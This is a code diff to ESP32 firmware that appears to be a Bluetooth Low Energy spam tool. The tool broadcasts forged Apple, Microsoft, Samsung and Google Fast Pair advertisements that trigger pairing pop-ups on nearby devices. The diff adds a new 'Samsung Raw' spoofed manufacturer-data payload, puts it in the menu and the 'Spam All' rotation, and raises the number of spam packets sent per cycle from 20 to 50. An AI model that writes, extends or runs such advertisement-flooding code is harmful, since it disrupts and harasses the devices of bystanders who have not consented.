@@ -19,9 +19,7 @@
 #define MAX_TX_POWER ESP_PWR_LVL_P9
 #endif
 
-enum EBLEPayloadType { AppleIOS, Microsoft, SamsungWatch, SamsungBuds, GoogleFastPair, CustomName };
-
-const uint8_t SAMSUNG_PREPENDED_BYTES[] = {0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43};
+enum EBLEPayloadType { AppleIOS, Microsoft, SamsungWatch, SamsungBuds, SamsungRaw, GoogleFastPair, CustomName };
 
 const char* samsung_watch_names[] = {
   "Fallback Watch", "White Watch4 Classic 44mm", "Black Watch4 Classic 40mm", 
@@ -117,33 +115,6 @@ uint8_t* createApplePacket(uint8_t deviceType, bool isContinuity = false) {
         memcpy(packet, device_base, 31);
         return packet;
     }
-}
-
-uint8_t* build_samsung_raw_packet(uint8_t watch_id, size_t* out_len) {
-    const uint16_t MANUFACTURER_ID = 0x0075;
-    size_t man_len = 2 + sizeof(SAMSUNG_PREPENDED_BYTES) + 1;
-    uint8_t* man_data = (uint8_t*)malloc(man_len);
-    
-    man_data[0] = MANUFACTURER_ID & 0xFF;
-    man_data[1] = MANUFACTURER_ID >> 8;
-    memcpy(man_data + 2, SAMSUNG_PREPENDED_BYTES, sizeof(SAMSUNG_PREPENDED_BYTES));
-    man_data[2 + sizeof(SAMSUNG_PREPENDED_BYTES)] = watch_id;
-    
-    const uint8_t flags[] = {0x02,0x01,0x06};
-    size_t total_len = sizeof(flags) + 2 + man_len;
-    uint8_t* adv = (uint8_t*)malloc(total_len);
-    
-    size_t idx = 0;
-    memcpy(adv + idx, flags, sizeof(flags));
-    idx += sizeof(flags);
-    adv[idx++] = man_len + 1;
-    adv[idx++] = 0xFF;
-    memcpy(adv + idx, man_data, man_len);
-    idx += man_len;
-    
-    free(man_data);
-    *out_len = idx;
-    return adv;
 }
 
 BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int specific_index = -1) {
@@ -256,6 +227,20 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
             break;
         }
         
+        case SamsungRaw: {
+            uint8_t prependedBytes[] = {0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43};
+            uint8_t watch_id = samsung_watch_ids[random(26)];
+            
+            uint8_t payload[13];
+            payload[0] = 0x75;
+            payload[1] = 0x00;
+            memcpy(payload + 2, prependedBytes, 10);
+            payload[12] = watch_id;
+            
+            AdvData.addData(std::string((char*)payload, 13));
+            break;
+        }
+        
         case GoogleFastPair: {
             const uint32_t model = android_models[rand() % android_models_count].value;
             uint8_t Google_Data[14] = {
@@ -331,7 +316,7 @@ void aj_adv(int ble_choice) {
     static int samsung_index = 0;
     static int spam_all_index = 0;
     
-    if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }
+    if (ble_choice == 7) { spamName = keyboard("", 10, "Name to spam"); }
     timer = millis();
     
     while (1) {
@@ -347,28 +332,33 @@ void aj_adv(int ble_choice) {
                     break;
                 case 2:
                     displayTextLine("Samsung Watch (" + String(count) + ")");
-                    executeSpam(SamsungWatch, 20, samsung_index);
+                    executeSpam(SamsungWatch, 50, samsung_index);
                     samsung_index = (samsung_index + 1) % 26;
                     break;
                 case 3:
                     displayTextLine("Samsung Buds (" + String(count) + ")");
-                    executeSpam(SamsungBuds, 20);
+                    executeSpam(SamsungBuds, 50);
                     break;
                 case 4:
+                    displayTextLine("Samsung Raw (" + String(count) + ")");
+                    executeSpam(SamsungRaw, 50);
+                    break;
+                case 5:
                     displayTextLine("Google FastPair (" + String(count) + ")");
                     executeSpam(GoogleFastPair, 20);
                     break;
-                case 5:
+                case 6:
                     displayTextLine("Spam All (" + String(count) + ")");
-                    switch(spam_all_index % 4) {
-                        case 0: executeSpam(AppleIOS, 20); break;
-                        case 1: executeSpam(SamsungWatch, 20, random(26)); break;
-                        case 2: executeSpam(SamsungBuds, 20); break;
-                        case 3: executeSpam(Microsoft, 20); break;
+                    switch(spam_all_index % 5) {
+                        case 0: executeSpam(AppleIOS, 50); break;
+                        case 1: executeSpam(SamsungWatch, 50, random(26)); break;
+                        case 2: executeSpam(SamsungBuds, 50); break;
+                        case 3: executeSpam(SamsungRaw, 50); break;
+                        case 4: executeSpam(Microsoft, 50); break;
                     }
                     spam_all_index++;
                     break;
-                case 6:
+                case 7:
                     displayTextLine("Custom Name (" + String(count) + ")");
                     executeCustomSpam(spamName);
                     break;
